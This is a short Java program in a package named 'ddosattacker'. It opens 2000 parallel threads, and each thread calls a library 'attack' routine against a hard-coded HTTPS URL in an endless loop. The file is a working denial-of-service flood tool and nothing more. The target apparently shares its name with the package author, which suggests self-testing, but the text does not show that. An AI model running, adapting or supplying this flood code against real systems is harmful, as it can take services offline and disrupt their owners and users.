package com.tugalsan.trm.ddosattacker;

import com.tugalsan.api.thread.server.TS_ThreadRun;
import com.tugalsan.api.url.client.TGS_Url;
import com.tugalsan.api.url.server.TS_UrlDDosUtils;
import java.util.stream.*;

public class Main {

    public static void main(String... args) {
        var url = TGS_Url.of("https://tugalsan.com:8443");
        IntStream.range(0, 2000).parallel().forEach(i -> TS_ThreadRun.now(() -> {
            while (true) {
                TS_UrlDDosUtils.attack(url);
            }
        }));
    }

}
